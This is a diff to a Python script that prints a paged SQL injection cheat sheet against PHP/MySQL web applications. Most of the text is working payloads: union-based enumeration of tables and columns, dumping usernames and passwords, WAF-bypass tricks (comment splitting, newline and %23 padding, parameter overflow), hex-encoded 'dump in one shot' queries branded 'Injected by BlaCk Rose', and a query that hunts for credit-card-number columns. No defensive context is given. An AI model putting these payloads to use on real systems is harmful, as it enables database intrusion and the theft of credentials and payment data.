@@ -82,17 +82,17 @@ cat= 3-.1GROUPBY1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,2
 ----------------------------------------------------------------------------
 cat=.4 union select version(),2-- -
 ----------------------------------------------------------------------------
-cat=.5 union select table_name,2       froM+InfORmaTion_scHema.tAblES -- -
+cat=.5 union select table_name          froM+InfORmaTion_scHema.tAblES -- -
 ----------------------------------------------------------------------------
-cat=.6 union select table_name,2       froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
+cat=.6 union select table_name          froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
 ----------------------------------------------------------------------------
-cat=.7 union select group_concat(table_name),2      froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
+cat=.7 union select group_concat(table_name)         froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
 ----------------------------------------------------------------------------
 http://www.waraxe.us/sql-char-encoder.html
 ----------------------------------------------------------------------------
-cat=.8 union select group_concat(column_name),2+froM+InfORmaTion_scHema.cOlumnS WheRe+tAblE_naMe=0x6d656d626572 -- -
+cat=.8 union select group_concat(column_name)   +froM+InfORmaTion_scHema.cOlumnS WheRe+tAblE_naMe=0x6d656d626572 -- -
 ----------------------------------------------------------------------------
-cat=.9 union select group_concat(username,0x3a,password),2 from member -- -
+cat=.9 union select group_concat(username,0x3a,password)    from member -- -
 ----------------------------------------------------------------------------
 """
 
@@ -124,6 +124,9 @@ union select group_concat(column_name) froM InfORmaTion_scHema.cOlumnS WheRe tAb
 ----------------------------------------------------------------------------
 union select group_concat(column,0x3a,column) from YOUR TABLE NAME  -- - 
 ----------------------------------------------------------------------------
+
+
+
 """
 
 
@@ -132,6 +135,36 @@ print(level1)
 
 input("[Pres Enter]")
 clear()
+
+
+
+remod=""" 
+
+php?id=.1'  and .0UnIOn-- -%0ASeLeCt 1,2,3-- -
+----------------------------------------------------------------------------
+php?id=5 and .0UnIOn-- -%0ASeLeCt 1,2,3,4,5,6 -- -
+ ----------------------------------------------------------------------------
+php?id=25' and .0UnIOn-- -%0ASeLeCt 1,2,3,4,5,6 -- -
+----------------------------------------------------------------------------
+php?id=7 and .0UnIOn-- -%0ASeLeCt 1,2,3,4-- -
+----------------------------------------------------------------------------
+
+
+"""
+
+clear()
+print(remod)
+
+input("[Pres Enter]")
+clear()
+
+
+
+
+
+
+
+
 
 level2=W+"""
 ----------------------------------------------------------------------------
@@ -508,10 +541,12 @@ bravo="""
 *************************************************************
 illegal mix of collations
 **************************************
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 convert(value using xxxx)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 --------------------------------------------------------------------------------------------
-convert(group concat (mysites) ascii)
+convert(group_concat(table_name) using ascii)
+
 
 --------------------------------------------------------------------------------------------
 unhex(hex(value))
@@ -576,6 +611,9 @@ charle="""
 union23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaselect
 --------------------------------------------------------------------------------------------
 union%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0aselect
+
+cat=.4 union select version(),2 -- -&cacat=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
 """
 
 clear()
@@ -619,7 +657,7 @@ input("[Pres Enter]")
 
 
 
-idia="""
+india="""
 Contradictory errors
 --------------------------------------------------------------------------------------------
 cat=7' is null
@@ -649,9 +687,6 @@ cat=43' and 0 union/**/distinctrow Select 1,version()-- -&id=230
 
 .4/*!32302union*/ /**/select/**/version(),2 -- -
 .4/*!32302union*/distinctrow /**/select/**/version(),2 -- -
-.4 and null /*!32302union*/distinctrow /**/select/**/version(),2 -- -
-
-
 """
 
 
@@ -664,12 +699,12 @@ input("[Pres Enter]")
 
 
 
-403 Forbidden 
 
 
 
 
-brute forcing columns in SQL By Check Every Column
+
+
 
 
 
@@ -881,3 +916,79 @@ print(extra)
 input("[Pres Enter]")
 
 clear()
+
+
+"""
+-------------------------------------------------------------------------
+
+
+
+export_set(5,@:=0,(select count(*)/*!50000from*/ /*!50000information_schema*/.columns where table_schema=database() and @:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)
+
+
+export_set(5,@:=0,(select count(*)/*!50000from*/ /*!50000information_schema*/.columns where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)
+
+
+make_set(6,@:=0x0a,(/*!50000select*/(1) from (/*!50000information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!50000table_name*/,/*!50000column_name*/)),@)
+
+
+replace(replace(replace(0x232425,0x23,@:=replace(replace(0x243a3a25,0x24,@@version),0x25 ,version())),0x24,(select count(*)from /*!50000information_schema*/.columns where table_schema=database() and@:=replace(replace(replace(0x03c62723e2a3a3a2d,0x00,@),0x2a,table_name),0x2d,Column_name))),0x25,@)
+
+
+reverse(insert(0x1,1,0,reverse(unhex(hex(table_name))))) FROM information_schema 0.e.tables limit 1,1
+
+reverse(insert(0x1,1,0,reverse(concat (unhex(hex(table_name)),0x203a20,unhex(hex(column_name)),0x3c62723e)))) from information_schema 0.e.columns limit 1,1
+
+-------------------------------------------------------------------------
+
+"COALESCE" Function
+-------------------------------------------------------------------------
+
+
+concat(0x3c666f6e7420636f6c6f723d707572706c653e3c623e3c693e436865657461682048657265203a3a20,@@version,0x3c62723e,0x3c62723e,(SELECT GROUP_CONCAT(table_name,0x203a3a20,COALESCE(table_rows,0) order by COALESCE(table_rows,0) ASC SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()))
+
+-------------------------------------------------------------------------
+ "IFNULL" function
+-------------------------------------------------------------------------
+
+concat(0x3c666f6e7420636f6c6f723d707572706c653e3c623e3c693e436865657461682048657265203a3a20,@@version,0x3c62723e,0x3c62723e,(SELECT GROUP_CONCAT(table_name,0x203a3a20,ifnull(table_rows,0) order by ifnull(table_rows,0) ASC SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()))
+
+-------------------------------------------------------------------------
+
+
+
+(replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x753c62723e763c62723e773c62723e78,0x75,0x3c666f6e7420636f6c6f723d7265642073697a653d3530303e494e4a4543544f523c2f666f6e743e3c62723e),0x76,version()),0x77,user()),0x78,database())),0x24,(select count(*)from(information_schema.columns)where table_schema=database() and@:=replace(replace(replace(0x03c62723e2a3a3a2d,0x00,@),0x2a,table_name),0x2d,column_name))),0x25,@))
+-------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------
+MID_SEPARATOR
+-------------------------------------------------------------------------
+
+(select MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns)
+
+-------------------------------------------------------------------------
+
+DUMP Column
+-------------------------------------------------------------------------
+
+concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e
+3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c65
+3d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6
+a656374656420627920426c61436b20526f7365205b4748545d3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f
+6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d6
+77265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a
+3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c
+666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e
+203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e7
+33c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,(Select count(*)from(information_Schema.columns)where(table_schema=database())and@:=concat/**/(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e2
+03a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name
+,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c627
+23e3c62723e3c62723e)
+-------------------------------------------------------------------------
+ DUMP cardnumber
+-------------------------------------------------------------------------
+
+(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select CASE WHEN ( (select  count(*) from information_schema.columns where table_name=@tbl and  column_name like 0x25636172646e756d62657225)>0) THEN  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a20636172646e756d626572202a2a2a203c2f623e3c666f6e7420636f6c6f723d6
+26c75653e else 0x00 END)))))x)
+"""
